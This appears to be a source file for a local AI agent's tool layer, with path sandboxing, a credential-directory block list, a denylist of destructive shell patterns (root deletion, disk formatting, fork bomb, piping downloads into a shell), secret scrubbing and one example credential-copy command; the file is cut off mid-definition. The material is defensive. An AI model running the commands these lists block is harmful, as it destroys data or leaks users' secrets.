/**
 * tools.js — the claws.
 *
 * Every tool is declared once, in one place, with:
 *   name, description, parameters (JSON Schema), dangerous flag, run().
 *
 * The dangerous flag is what drives the in-chat permission prompt, so
 * anything that can mutate the machine MUST set it.
 */
import { spawn } from "node:child_process";
import { Worker } from "node:worker_threads";
import { readFile, writeFile, readdir, stat, mkdir } from "node:fs/promises";
import { SKIP_DIRS } from "./scan.js";
import { existsSync, realpathSync } from "node:fs";
import { basename, dirname, isAbsolute, relative, resolve, join } from "node:path";
import { homedir } from "node:os";
import { config } from "./config.js";
import { addSource } from "./sources.js";
import {
  remember, loadMemory, forget, loadTasks, saveTask,
  addReminder, pendingReminders, removeReminder,
} from "./store.js";
import { parseWhen, humaniseDuration, formatClock } from "./timeparse.js";
import { addSchedule, listSchedules, deleteSchedule } from "./schedules.js";

/* ───────────────────────────── path sandboxing ─────────────────────────── */

// (GREP_BYTE_CAP lived here until the scan moved to grep-worker.js, which caps
// its own reads. One definition of "how much of a file is enough to search".)

export class SafePathError extends Error {}

/**
 * Resolve symlinks for the part of the path that exists, keeping the rest
 * literal. A purely lexical check (`relative()`) is not enough: a symlink
 * inside the workspace pointing at /etc passes it and then reads /etc/passwd.
 * This is the difference between a sandbox and a sign saying "sandbox".
 */
function canonicalise(target) {
  let current = target;
  const missing = [];
  while (!existsSync(current)) {
    const parent = dirname(current);
    if (parent === current) break;
    missing.unshift(basename(current));
    current = parent;
  }
  let real;
  try {
    real = realpathSync(current);
  } catch {
    real = current;
  }
  return missing.length ? resolve(real, ...missing) : real;
}

function isInside(root, target) {
  const rel = relative(root, target);
  return rel === "" || (!rel.startsWith("..") && !isAbsolute(rel));
}

/**
 * Paths that are never a workspace, whatever the workspace is.
 *
 * `PINCH_WORKSPACE` defaults to the home directory, so "inside the workspace"
 * is not the same as "safe to read": ~/.ssh/id_rsa is inside $HOME. The agent
 * has no business opening a credential store, and the one time it would is the
 * one time it has been talked into it — by a web page, a tool output, or an
 * attached document. Denying them here means the sandbox is about *intent*,
 * not just geometry.
 *
 * A user who genuinely wants the agent in ~/.ssh can add the path to
 * PINCH_WORKSPACE_TTL... no: they can move the workspace. Deliberate friction.
 */
const PROTECTED = [
  ".ssh", ".aws", ".gnupg", ".kube", ".netrc", ".git-credentials",
  ".npmrc", ".pypirc", ".config/gh", ".config/gcloud", ".config/pip",
  ".docker/config.json", ".azure", "Library/Keychains",
].map((p) => join(homedir(), p));

export function isProtected(target) {
  const real = (() => {
    try {
      return realpathSync(target);
    } catch {
      return target;
    }
  })();
  return PROTECTED.some((p) => target === p || target.startsWith(p + "/") ||
    real === p || real.startsWith(p + "/"));
}

export function resolveInWorkspace(input) {
  const raw = String(input || ".").replace(/^~(?=$|\/)/, homedir());
  const abs = isAbsolute(raw) ? resolve(raw) : resolve(config.workspaceRoots[0], raw);

  // Lexical check first (cheap, catches ../../ escapes with a clear message),
  // then the real one, which catches symlinks and anything else the filesystem
  // does behind our back.
  const lexicalOk = config.workspaceRoots.some((root) => isInside(root, abs));
  const canonical = canonicalise(abs);
  const realOk = config.workspaceRoots.some((root) => isInside(canonicalise(root), canonical));

  if (isProtected(abs) || isProtected(canonical)) {
    throw new SafePathError(
      `Blocked: ${abs} is a credential store, not a workspace. Pinch never reads ` +
        `~/.ssh, ~/.aws, ~/.gnupg or similar — not even when your workspace is your home directory.`
    );
  }

  if (!lexicalOk || !realOk) {
    const why = lexicalOk && !realOk ? " (a symlink points outside it)" : "";
    throw new SafePathError(
      `Blocked: ${abs} is outside the allowed workspace${why}. ` +
        `Allowed roots: ${config.workspaceRoots.join(", ")}. ` +
        `Add a root to PINCH_WORKSPACE in .env if that is a mistake.`
    );
  }
  return abs;
}

/**
 * Refuse filenames that are only interesting to a shell.
 *
 * resolveInWorkspace answers "is this inside the workspace"; it does not and
 * cannot answer "is this string safe to hand to another program". A name
 * containing $(...), a backtick, a quote or a newline is legal on every
 * filesystem and is a command waiting for a shell. Nothing Pinch writes needs
 * those characters, so anything that uses one is refused here rather than
 * being escaped later by whoever remembers to.
 */
export function checkFilename(name) {
  if (name == null) return { ok: true };
  const value = String(name);
  if (value.length > 200) return { ok: false, output: "That path is too long (200 characters)." };
  // Only the characters that change *command structure* are refused. Parentheses
  // and braces are ordinary in filenames ("My File (2).png") and harmless once
  // the shell is gone; `$` is what turns (2) into $(2).
  const bad = /[`$|;&<>\n\r\0]/.test(value);
  if (bad) {
    return {
      ok: false,
      output:
        "That path contains shell metacharacters ($ ` | ; & < > or a newline). " +
        "Pinch will not build a command from it. Use plain letters, digits, dots, dashes, underscores and slashes.",
    };
  }
  return { ok: true };
}

/* ─────────────────────────── catastrophic command guard ────────────────── */

/**
 * Layered guard rails, weakest to strongest — and be honest about which is which:
 *
 *   1. this screen      heuristics; stops the obvious catastrophes
 *   2. the approval gate a human sees the exact command and says yes
 *   3. the env scrub     secrets are not in the child's environment at all
 *
 * A screen can never be complete (it is a denylist against an infinite space
 * of shell syntax), so it is written to catch what is *unambiguously* fatal
 * and to *flag* — not silently allow — anything reaching outside the
 * workspace. The human gate remains the load-bearing control.
 */
const DENY = [
  { re: /\brm\s+(-[a-zA-Z]*\s+)*\/\s*$/, why: "recursive delete of the filesystem root" },
  { re: /\brm\s+-[a-zA-Z]*[rf][a-zA-Z]*\s+(\/|~|\$HOME|\$\{HOME\})\s*\/?\s*(\*)?\s*$/, why: "recursive delete of / or your home directory" },
  { re: /\brm\s+-[a-zA-Z]*[rf][a-zA-Z]*\s+(\.|\.\.|\.\/|\.\.\/)\s*$/, why: "recursive delete of the current or parent directory" },
  { re: /\b(mkfs|fdisk|parted)\b/, why: "partitioning or formatting a filesystem" },
  { re: /\bdd\b[^\n]*\bof=\/dev\/(sd|nvme|disk|hd)/, why: "raw write to a block device" },
  { re: />\s*\/dev\/(sd|nvme|disk|hd)/, why: "raw write to a block device" },
  { re: /:\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:/, why: "fork bomb" },
  { re: /\bchmod\s+-R\s+(777|000)\s+\/\s*$/, why: "unlocking or bricking permissions on the whole filesystem" },
  { re: /\bchown\s+-R\s+[^\s]+\s+\/\s*$/, why: "re-owning the whole filesystem" },
  { re: /\bfind\s+\/\s[^\n]*-delete/, why: "deleting everything under /" },
  { re: /\b(shutdown|reboot|halt|poweroff)\b/, why: "powering the machine off (not available to the agent)" },
  { re: /\b(curl|wget)\b[^\n]*\|\s*(sudo\s+)?(sh|bash|zsh|python|node|perl)\b/, why: "piping a download straight into an interpreter" },
];

/** Absolute paths that are outside the workspace — worth a human's attention. */
export function describeEscapes(command) {
  const roots = config.workspaceRoots;
  const outside = new Set();

  // Absolute paths, plus the two forms that expand into one. The old pattern
  // matched only `/word/...`, so `cp ~/.aws/credentials ./creds` — the exact
  // shape of a credential exfiltration — produced no warning at all, and
  // neither did `cd $HOME`.
  const candidates = String(command).match(/(?:^|[\s'"=])((?:~|\$HOME|\$\{HOME\})[\w./@+-]*|\/[\w.\-+@]+(?:\/[\w.\-+@]*)*)/g) || [];

  for (const raw of candidates) {
    let path = raw.trim().replace(/^[\s'"=]/, "");
    path = path.replace(/^(~|\$HOME|\$\{HOME\})(?=$|\/)/, homedir());
    if (!path.startsWith("/")) continue;
    if (/^\/(dev|proc|sys)\b/.test(path)) continue;

    const real = (() => {
      try {
        return realpathSync(path);
      } catch {
        return path;
      }
    })();

    const inside = roots.some((root) => path === root || path.startsWith(root + "/") ||
      real === root || real.startsWith(root + "/"));
    if (!inside) outside.add(path);
  }
  // `cd ../../..` cannot be resolved without knowing the cwd, and pretending
  // otherwise would be worse than saying it: flag the shape so the human sees
  // that the command intends to leave, even though we cannot name where it lands.
  if (/(?:^|[;&|]\s*)cd\s+(?:\.\.?(?:\/|\s|$))/.test(String(command))) {
    outside.add("a relative path (cd ..) — target cannot be resolved before it runs");
  }

  return [...outside].slice(0, 4);
}

export function screenCommand(command) {
  const flat = String(command).replace(/\s+/g, " ").trim();
  for (const rule of DENY) {
    if (rule.re.test(flat)) return { allowed: false, reason: rule.why };
  }
  const escapes = describeEscapes(flat);
  return { allowed: true, escapes };
}

/* ────────────────────────────── shell runner ───────────────────────────── */

/**
 * Build the environment for a child process without handing it the keys to the
 * kingdom. Everything that looks like a credential is stripped; PATH, HOME and
 * the rest survive. `PINCH_ENV_PASSTHROUGH=NPM_TOKEN,GITHUB_TOKEN` re-adds
 * specific names when a build genuinely needs one.
 */
const SECRETISH = /(TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|PRIVATE_KEY|API_KEY|_KEY$|^KEY$|SESSION|COOKIE)/i;

export function childEnv(allow = config.envPassthrough) {
  const env = {};
  const allowed = new Set((allow || []).map((s) => s.toUpperCase()));
  for (const [key, value] of Object.entries(process.env)) {
    if (SECRETISH.test(key) && !allowed.has(key.toUpperCase())) continue;
    env[key] = value;
  }
  env.PINCH = "1";
  return env;
}

export function runShell(command, { cwd, timeoutMs = config.shellTimeoutMs } = {}) {
  return new Promise((resolvePromise) => {
    const child = spawn(command, {
      shell: true,
      // Own process group, so a timeout can kill the whole tree rather than
      // just the shell it was launched from. Otherwise `sleep 300 &` survives.
      detached: process.platform !== "win32",
      cwd: cwd && !isAbsolute(cwd) ? resolve(config.workspaceRoots[0], cwd) : cwd || config.workspaceRoots[0],
      env: childEnv(),
    });
    let stdout = "";
    let stderr = "";
    let killed = false;

    const timer = setTimeout(() => {
      killed = true;
      try {
        if (process.platform !== "win32" && child.pid) process.kill(-child.pid, "SIGKILL");
        else child.kill("SIGKILL");
      } catch {
        try { child.kill("SIGKILL"); } catch {}
      }
    }, timeoutMs);

    child.stdout.on("data", (d) => {
      if (stdout.length < 60_000) stdout += d.toString();
    });
    child.stderr.on("data", (d) => {
      if (stderr.length < 20_000) stderr += d.toString();
    });
    child.on("error", (err) => {
      clearTimeout(timer);
      resolvePromise({ ok: false, code: null, stdout, stderr: String(err.message), killed });
    });
    child.on("close", (code) => {
      clearTimeout(timer);
      resolvePromise({ ok: code === 0 && !killed, code, stdout, stderr, killed });
    });
  });
}

/**
 * Run one program with an argv array — no shell, ever.
 *
 * `runShell` exists because some things genuinely need a pipeline, and the
 * permission prompt shows the human that exact pipeline. But any tool that has
 * a *filename* parameter must not use it: a filename is data, and data that
 * reaches a shell string is a command. This is the runner those tools use.
 *
 * @returns {Promise<{ok: boolean, stdout: string, stderr: string}>}
 */
export function runProgram(file, args, { timeoutMs = 15_000, env } = {}) {
  return new Promise((resolvePromise) => {
    let child;
    try {
      child = spawn(file, args, {
        shell: false,
        stdio: ["ignore", "pipe", "pipe"],
        env: env || childEnv(),
      });
    } catch (err) {
      return resolvePromise({ ok: false, stdout: "", stderr: String(err.message) });
    }
    let stdout = "";
    let stderr = "";
    const timer = setTimeout(() => {
      try { child.kill("SIGKILL"); } catch {}
    }, timeoutMs);

    child.stdout?.on("data", (d) => {
      if (stdout.length < 20_000) stdout += d.toString();
    });
    child.stderr?.on("data", (d) => {
      if (stderr.length < 8_000) stderr += d.toString();
    });
    // ENOENT arrives as an error, not a non-zero exit — report it as "missing"
    // so the caller can try the next candidate binary.
    child.on("error", (err) => {
      clearTimeout(timer);
      resolvePromise({ ok: false, missing: err.code === "ENOENT", stdout, stderr: String(err.message) });
    });
    child.on("close", (code) => {
      clearTimeout(timer);
      resolvePromise({ ok: code === 0, code, stdout, stderr });
    });
  });
}

/** Try each candidate in order; the first that exists and exits 0 wins. */
export async function runFirstAvailable(candidates, opts) {
  const tried = [];
  for (const [file, args] of candidates) {
    const res = await runProgram(file, args, opts);
    if (res.ok) return { ...res, used: file };
    tried.push(res.missing ? `${file} (not installed)` : `${file} (${res.stderr.trim().slice(0, 120) || `exit ${res.code}`})`);
  }
  return { ok: false, stdout: "", stderr: tried.join("; ") || "no capture tool found" };
}

/* ──────────────────────── tiny safe math evaluator ─────────────────────── */

const FUNCS = {
  sqrt: Math.sqrt, abs: Math.abs, round: Math.round, floor: Math.floor,
  ceil: Math.ceil, log: Math.log, log10: Math.log10, exp: Math.exp,
  sin: Math.sin, cos: Math.cos, tan: Math.tan, min: Math.min, max: Math.max,
};
const CONSTS = { pi: Math.PI, e: Math.E };

/** Shunting-yard. No eval(), no Function(), no surprises. */
export function calculate(expression) {
  const src = String(expression).toLowerCase().replace(/\s+/g, "").replace(/×/g, "*").replace(/÷/g, "/");
  if (!/^[-+*/%^().,0-9a-z]+$/.test(src)) throw new Error("Only numbers, + - * / % ^ ( ) and simple functions are allowed.");

  const tokens = src.match(/(\d+\.?\d*|\.\d+|[a-z]+|[-+*/%^(),])/g);
  if (!tokens) throw new Error("Nothing to calculate.");

  const out = [];
  const ops = [];
  const prec = { "+": 1, "-": 1, "*": 2, "/": 2, "%": 2, "^": 3, "u-": 4 };
  const rightAssoc = new Set(["^", "u-"]);
  let prev = null;

  for (let i = 0; i < tokens.length; i++) {
    const t = tokens[i];
    if (/^\d/.test(t) || /^\.\d/.test(t)) {
      out.push(Number(t));
    } else if (/^[a-z]+$/.test(t)) {
      if (t in CONSTS) out.push(CONSTS[t]);
      else if (t in FUNCS) ops.push(t);
      else throw new Error(`Unknown name: ${t}`);
    } else if (t === "(") {
      ops.push(t);
    } else if (t === ")") {
      while (ops.length && ops[ops.length - 1] !== "(") out.push(ops.pop());
      if (!ops.length) throw new Error("Unbalanced parentheses.");
      ops.pop();
      if (ops.length && ops[ops.length - 1] in FUNCS) out.push(ops.pop());
    } else if (t === ",") {
      while (ops.length && ops[ops.length - 1] !== "(") out.push(ops.pop());
    } else {
      let op = t;
      if (op === "-" && (prev === null || prev === "(" || prev === "," || (typeof prev === "string" && prev in prec && prev !== ")"))) {
        op = "u-";
      }
      while (
        ops.length &&
        ops[ops.length - 1] in prec &&
        ((prec[ops[ops.length - 1]] > prec[op]) ||
          (prec[ops[ops.length - 1]] === prec[op] && !rightAssoc.has(op)))
      ) {
        out.push(ops.pop());
      }
      ops.push(op);
    }
    prev = t;
  }
  while (ops.length) {
    const op = ops.pop();
    if (op === "(") throw new Error("Unbalanced parentheses.");
    out.push(op);
  }

  const stack = [];
  for (const token of out) {
    if (typeof token === "number") {
      stack.push(token);
    } else if (token === "u-") {
      stack.push(-stack.pop());
    } else if (token in FUNCS) {
      const fn = FUNCS[token];
      const args = [];
      while (stack.length && args.length < (fn.length || 1)) args.unshift(stack.pop());
      if (!args.length) throw new Error(`${token}() needs an argument.`);
      stack.push(fn(...args));
    } else {
      const b = stack.pop();
      const a = stack.pop();
      if (a === undefined || b === undefined) throw new Error("Malformed expression.");
      stack.push(
        token === "+" ? a + b :
        token === "-" ? a - b :
        token === "*" ? a * b :
        token === "/" ? a / b :
        token === "%" ? a % b :
        a ** b
      );
    }
  }
  const result = stack.pop();
  if (result === undefined || Number.isNaN(result)) throw new Error("Could not evaluate that.");
  return result;
}

/* ────────────────────────── workspace inspection ───────────────────────── */

/* SKIP_DIRS and the bounded reader live in scan.js, shared with the grep
 * worker so the two can never disagree about what a workspace contains. */

export async function treeSummary(root, { maxDepth = 3, maxEntries = 120 } = {}) {
  const lines = [];
  async function walk(dir, depth, prefix) {
    if (lines.length >= maxEntries) return;
    let entries;
    try {
      entries = await readdir(dir, { withFileTypes: true });
    } catch {
      return;
    }
    // This was `!x === false || true`, which is always true — the intended
    // "skip dotfiles" never happened. (.env is skipped again below, because a
    // project tree should never advertise where the keys live.)
    entries = entries
      .filter((e) => !SKIP_DIRS.has(e.name) && !e.name.startsWith("."))
      .sort((a, b) => Number(b.isDirectory()) - Number(a.isDirectory()) || a.name.localeCompare(b.name));
    for (const entry of entries) {
      if (lines.length >= maxEntries) return;
      if (entry.name.startsWith(".env")) continue;
      lines.push(`${prefix}${entry.isDirectory() ? "📁" : "·"} ${entry.name}`);
      if (entry.isDirectory() && depth < maxDepth) {
        await walk(join(dir, entry.name), depth + 1, `${prefix}  `);
      }
    }
  }
  await walk(root, 1, "");
  return lines.join("\n");
}

/* ────────────────────────────── grep worker ────────────────────────────── */

/** How long a single grep may run before the thread is terminated. */
const GREP_TIMEOUT_MS = 3_000;

/**
 * Run the scan on a worker thread and kill it if it misbehaves.
 *
 * Node's regex engine cannot be interrupted, so the only reliable containment
 * is a separate thread we can terminate. The message the model gets back is
 * actionable, because a model that has just been told "too expensive" will
 * simplify the pattern — a model that gets silence will retry it.
 */
export function grepInWorker({ root, pattern, glob }, timeoutMs = GREP_TIMEOUT_MS) {
  return new Promise((resolvePromise) => {
    let settled = false;
    const finish = (value) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      resolvePromise(value);
    };

    let worker;
    try {
      worker = new Worker(new URL("./grep-worker.js", import.meta.url), {
        workerData: { root, pattern: String(pattern), glob: glob ? String(glob) : null },
        resourceLimits: { maxOldGenerationSizeMb: 128 },
        // Never inherit the host's flags: `node --input-type=module` in
        // execArgv makes every Worker fail to start, and Pinch should not
        // depend on how it was launched.
        execArgv: [],
      });
    } catch (err) {
      return resolvePromise({ ok: false, output: `grep could not start: ${err.message}` });
    }

    const timer = setTimeout(() => {
      worker.terminate();
      finish({
        ok: false,
        output:
          `That pattern was too expensive to run (more than ${Math.round(timeoutMs / 1000)}s). ` +
          `Avoid nested quantifiers like (a+)+ or (\\w+)* — try a simpler expression.`,
      });
    }, timeoutMs);

    worker.on("message", (msg) => {
      worker.terminate();
      if (msg.ok) finish({ ok: true, output: msg.hits.join("\n") || "No matches." });
      else finish({ ok: false, output: `grep failed: ${msg.error}` });
    });
    worker.on("error", (err) => finish({ ok: false, output: `grep failed: ${err.message}` }));
    worker.on("exit", () => finish({ ok: false, output: "grep worker exited without a result." }));
  });
}

/* ──────────────────────────────── tool defs ────────────────────────────── */

const stringProp = (description) => ({ type: "string", description });

/** decodeURIComponent that returns its input rather than throwing. */
function safeDecode(value) {
  try {
    return decodeURIComponent(value);
  } catch {
    return value;
  }
}

/** Fire-and-forget opener for a URL, per platform. Never shells out user text. */
function openUrl(url) {
  const opener =
    process.platform === "darwin" ? ["open", [url]]
    : process.platform === "win32" ? ["cmd", ["/c", "start", "", url]]
    : ["xdg-open", [url]];
  const child = spawn(opener[0], opener[1], { detached: true, stdio: "ignore" });
  child.on("error", () => {});
  child.unref();
}

export const TOOLS = [
  {
    name: "shell",
    dangerous: true,
    description:
      "Run a shell command on the user's machine, inside the workspace. Use for git, tests, builds, " +
      "package managers, inspecting the system. Output is truncated. Prefer read_file/grep/list_dir " +
      "when you only need to look at something.",
    parameters: {
      type: "object",
      properties: {
        command: stringProp("The command line to run, e.g. 'npm test' or 'git status --short'"),
        cwd: stringProp("Optional working directory relative to the workspace"),
      },
      required: ["command"],
    },
    async run({ command, cwd }) {
      const screen = screenCommand(command);
      if (!screen.allowed) return { ok: false, output: `Refused: ${screen.reason}.` };
      const res = await runShell(command, { cwd });
      const parts = [];
      if (res.stdout.trim()) parts.push(res.stdout.trim());
      if (res.stderr.trim()) parts.push(`stderr:\n${res.stderr.trim()}`);
      if (res.killed) parts.push(`(timed out after ${config.shellTimeoutMs / 1000}s and was killed)`);
      return {
        ok: res.ok,
        code: res.code,
        output: parts.join("\n\n").slice(0, 12_000) || "(no output)",
      };
    },
  },
  {
    name: "read_file",
    description: "Read a text file from the workspace. Returns the first ~400 lines by default.",
    parameters: {
      type: "object",
      properties: {
        path: stringProp("Path relative to the workspace, or absolute inside it"),
        start_line: { type: "number", description: "1-based first line (optional)" },
        lines: { type: "number", description: "How many lines to read (default 400)" },
      },
      required: ["path"],
    },
    async run({ path, start_line, lines }, ctx = {}) {
      const abs = resolveInWorkspace(path);
      const text = await readFile(abs, "utf8");
      const all = text.split("\n");
      const from = Math.max(0, (start_line || 1) - 1);
      const count = lines || 400;
      const slice = all.slice(from, from + count);
      const shown = relative(config.workspaceRoots[0], abs) || abs;
      const header = `${shown} · lines ${from + 1}-${from + slice.length} of ${all.length}`;
      // A claim "your config says X" is checkable only if the reader can see
      // which file this turn read. Register it; the model cites it as [n].
      const id = addSource(ctx.sources, {
        kind: "file",
        title: shown,
        ref: shown,
        snippet: slice.join(" ").slice(0, 160),
      });
      const cite = id ? `  (cite as [${id}])` : "";
      return { ok: true, output: `${header}${cite}\n\n${slice.join("\n")}` };
    },
  },
  {
    name: "write_file",
    dangerous: true,
    description:
      "Create or overwrite a file in the workspace with the given exact content. " +
      "Always read a file before overwriting it.",
    parameters: {
      type: "object",
      properties: {
        path: stringProp("Path relative to the workspace"),
        content: stringProp("The complete new file content"),
      },
      required: ["path", "content"],
    },
    async run({ path, content }) {
      const abs = resolveInWorkspace(path);
      await mkdir(dirname(abs), { recursive: true });
      await writeFile(abs, content, "utf8");
      const bytes = Buffer.byteLength(content, "utf8");
      return { ok: true, output: `Wrote ${bytes} bytes to ${relative(config.workspaceRoots[0], abs) || abs}` };
    },
  },
  {
    name: "list_dir",
    description: "List a directory in the workspace, folders first.",
    parameters: {
      type: "object",
      properties: { path: stringProp("Directory path; '.' for the workspace root") },
      required: ["path"],
    },
    async run({ path }) {
      const abs = resolveInWorkspace(path || ".");
      const entries = await readdir(abs, { withFileTypes: true });
      const rows = entries
        .filter((e) => !e.name.startsWith(".env"))
        .sort((a, b) => Number(b.isDirectory()) - Number(a.isDirectory()) || a.name.localeCompare(b.name))
        .map((e) => `${e.isDirectory() ? "📁" : "· "} ${e.name}`);
      return { ok: true, output: rows.join("\n") || "(empty directory)" };
    },
  },
  {
    name: "grep",
    description:
      "Search file contents in the workspace with a regular expression. Use this before reading whole " +
      "files when you are looking for where something is defined or used.",
    parameters: {
      type: "object",
      properties: {
        pattern: stringProp("JavaScript regular expression"),
        path: stringProp("Directory to search; defaults to the workspace root"),
        glob: stringProp("Optional simple extension filter, e.g. 'js' or 'py'"),
      },
      required: ["pattern"],
    },
    async run({ pattern, path, glob }) {
      const abs = resolveInWorkspace(path || ".");
      // The pattern is model output, so it runs on a thread the parent can
      // kill. A catastrophic regex is then a 3-second apology to the model
      // instead of a frozen assistant for everyone.
      const result = await grepInWorker({ root: abs, pattern, glob });
      return result;
    },
  },
  {
    name: "scan_project",
    description:
      "Summarise a project: directory tree, detected stack (package.json / pyproject / etc.), and the " +
      "README headline. Use this first when asked to work on an unfamiliar repo.",
    parameters: {
      type: "object",
      properties: { path: stringProp("Project root inside the workspace") },
      required: ["path"],
    },
    async run({ path }) {
      const abs = resolveInWorkspace(path || ".");
      const tree = await treeSummary(abs);
      const signals = [];
      for (const [file, label] of [
        ["package.json", "Node.js"],
        ["pyproject.toml", "Python (pyproject)"],
        ["requirements.txt", "Python (requirements)"],
        ["Cargo.toml", "Rust"],
        ["go.mod", "Go"],
        ["Dockerfile", "Docker"],
        ["docker-compose.yml", "Docker Compose"],
        [".github/workflows", "GitHub Actions CI"],
      ]) {
        try {
          await stat(join(abs, file));
          signals.push(label);
        } catch {}
      }
      let head = "";
      for (const name of ["README.md", "readme.md", "README.txt"]) {
        try {
          head = (await readFile(join(abs, name), "utf8")).split("\n").slice(0, 12).join("\n");
          break;
        } catch {}
      }
      return {
        ok: true,
        output:
          `Project: ${abs}\nDetected: ${signals.join(", ") || "unknown"}\n\n` +
          `${head ? `README start:\n${head}\n\n` : ""}Tree:\n${tree}`,
      };
    },
  },
  {
    name: "calculator",
    description: "Evaluate an arithmetic expression exactly. Supports + - * / % ^, parentheses, and sqrt/log/sin/cos/min/max/round.",
    parameters: {
      type: "object",
      properties: { expression: stringProp("e.g. '(1200 * 1.18) / 3'") },
      required: ["expression"],
    },
    async run({ expression }) {
      // calculate() throws on non-arithmetic — a parser should. The tool layer
      // is where that becomes a normal { ok:false } the model can read, like
      // every other tool here.
      try {
        return { ok: true, output: `${expression} = ${calculate(expression)}` };
      } catch (err) {
        return { ok: false, output: err.message };
      }
    },
  },
  {
    name: "time_now",
    description: "Current date and time in the user's timezone.",
    parameters: { type: "object", properties: {} },
    async run() {
      const now = new Date();
      return {
        ok: true,
        output:
          `${now.toLocaleString("en-GB", { timeZone: config.timezone })} (${config.timezone})\n` +
          `ISO: ${now.toISOString()}`,
      };
    },
  },
  {
    name: "remember",
    description:
      "Save a durable fact about the user (preferences, names, project details, decisions) so it survives " +
      "restarts. Use sparingly for things they would expect you to know later.",
    parameters: {
      type: "object",
      properties: {
        fact: stringProp("The fact, written as a standalone sentence"),
        tag: stringProp("Optional category, e.g. 'preference' or 'project'"),
      },
      required: ["fact"],
    },
    async run({ fact, tag }) {
      remember(fact, tag || "general");
      return { ok: true, output: `Remembered: ${fact}` };
    },
  },
  {
    name: "recall",
    description: "List everything you have remembered about the user, optionally filtered by keyword.",
    parameters: {
      type: "object",
      properties: { query: stringProp("Optional keyword filter") },
    },
    async run({ query }) {
      const facts = loadMemory().facts;
      const filtered = query ? facts.filter((f) => f.text.toLowerCase().includes(String(query).toLowerCase())) : facts;
      return { ok: true, output: filtered.map((f) => `- ${f.text}`).join("\n") || "Nothing remembered yet." };
    },
  },
  {
    name: "forget",
    description: "Delete remembered facts matching a keyword. Use only when the user asks to forget something.",
    parameters: {
      type: "object",
      properties: { query: stringProp("Keyword identifying the facts to delete") },
      required: ["query"],
    },
    async run({ query }) {
      const { removed } = forget(query);
      return { ok: true, output: removed ? `Forgot ${removed} fact(s) matching "${query}".` : `Nothing matched "${query}".` };
    },
  },
  {
    name: "search_web",
    description:
      "Search the public web (DuckDuckGo) and return the top results with snippets. Use only when the answer " +
      "depends on current information; it is the one tool that needs the internet.",
    parameters: {
      type: "object",
      properties: { query: stringProp("Search query") },
      required: ["query"],
    },
    async run({ query }, ctx = {}) {
      try {
        const res = await fetch(
          `https://html.duckduckgo.com/html/?q=${encodeURIComponent(query)}`,
          { headers: { "user-agent": "Mozilla/5.0 (compatible; Pinch/1.0)" }, signal: AbortSignal.timeout(12_000) }
        );
        const html = await res.text();
        const results = [];
        const re = /<a[^>]+class="result__a"[^>]*href="([^"]+)"[^>]*>([\s\S]*?)<\/a>[\s\S]*?class="result__snippet"[^>]*>([\s\S]*?)<\/a>/g;
        let m;
        while ((m = re.exec(html)) && results.length < 6) {
          // Search results are HTML. This text is heading for a model, not a
          // browser, but "strip tags once" is not stripping: `<<b>>` becomes
          // `<b>` and a single pass leaves a tag behind (CodeQL was right).
          // Strip to a fixed point, and never decode &lt;/&gt; back into angle
          // brackets, so the result cannot contain a tag at all.
          const decode = (s) => {
            let out = s;
            for (let pass = 0; pass < 5; pass++) {
              const next = out.replace(/<[^>]*>/g, "");
              if (next === out) break;
              out = next;
            }
            if (/[<>]/.test(out)) out = out.replace(/[<>]/g, "");
            return out
              .replace(/&quot;/g, '"')
              .replace(/&#0*39;/g, "'")
              .replace(/&#0*27;/g, "'")
              .replace(/&nbsp;/g, " ")
              .replace(/&amp;/g, "&") // last: "&amp;lt;" ends as "&lt;", not "<"
              .trim();
          };
          const rawUrl = m[1];
          // decodeURIComponent throws on a malformed escape ("%zz"), and one
          // bad result used to abort the whole search.
          const clean = rawUrl.includes("uddg=")
            ? safeDecode(rawUrl.split("uddg=")[1].split("&")[0])
            : rawUrl;
          // The number in the output is the id the model must cite. Registering
          // happens here, at the moment of retrieval, so a citation later either
          // names something this turn actually fetched or it is a fabrication.
          const title = decode(m[2]);
          const snippet = decode(m[3]).slice(0, 220);
          const id = addSource(ctx.sources, { kind: "web", title, ref: clean, snippet });
          const label = id ? `[${id}]` : `${results.length + 1}.`;
          results.push(`${label} ${title}\n   ${clean}\n   ${snippet}`);
        }
        if (!results.length) return { ok: false, output: "No results (or the network is unavailable)." };
        return {
          ok: true,
          output:
            results.join("\n\n") +
            "\n\nCite what you use as [1], [2] — those numbers are how the reader checks you.",
        };
      } catch (err) {
        return { ok: false, output: `Web search failed: ${err.message}. I may be offline.` };
      }
    },
  },
  {
    name: "add_task",
    description: "Add an item to the user's task list.",
    parameters: {
      type: "object",
      properties: { title: stringProp("What needs doing") },
      required: ["title"],
    },
    async run({ title }) {
      const task = { id: `t_${Date.now()}`, title: String(title).slice(0, 200), done: false, at: new Date().toISOString() };
      saveTask(task);
      return { ok: true, output: `Added task: ${task.title}` };
    },
  },
  {
    name: "list_tasks",
    description: "List the user's tasks, open ones first.",
    parameters: { type: "object", properties: {} },
    async run() {
      const tasks = loadTasks().sort((a, b) => Number(a.done) - Number(b.done));
      return {
        ok: true,
        output: tasks.map((t) => `${t.done ? "✅" : "◻️"} ${t.title}`).join("\n") || "No tasks.",
      };
    },
  },
  {
    name: "complete_task",
    description: "Mark a task done by matching part of its title.",
    parameters: {
      type: "object",
      properties: { title: stringProp("Substring of the task title") },
      required: ["title"],
    },
    async run({ title }) {
      const needle = String(title).toLowerCase();
      const tasks = loadTasks();
      const match = tasks.find((t) => !t.done && t.title.toLowerCase().includes(needle));
      if (!match) return { ok: false, output: `No open task matching "${title}".` };
      match.done = true;
      saveTask(match);
      return { ok: true, output: `Done: ${match.title}` };
    },
  },
  {
    name: "remind",
    description:
      "Set a reminder or timer that is delivered later to the same chat the request came from. " +
      "Pass the user's own time phrase; do not convert it yourself. Understands 'in 20 minutes', " +
      "'in 2 hours', 'at 6pm', 'tomorrow at 9am', '2026-11-05 14:30'.",
    parameters: {
      type: "object",
      properties: {
        text: stringProp("What to remind them about, e.g. 'call mom'"),
        when: stringProp("The time phrase as the user said it, e.g. 'in 30 minutes' or 'at 6pm'"),
      },
      required: ["text", "when"],
    },
    async run({ text, when }, ctx = {}) {
      const parsed = parseWhen(when);
      if (!parsed) {
        return {
          ok: false,
          output:
            `I could not understand "${when}" as a time. Do not guess a time — ask the user to ` +
            `restate it (examples: "in 20 minutes", "at 6pm", "tomorrow at 9am").`,
        };
      }
      const reminder = {
        id: `r_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`,
        text: String(text).slice(0, 300),
        at: parsed.at.toISOString(),
        address: ctx.target || "web:main",
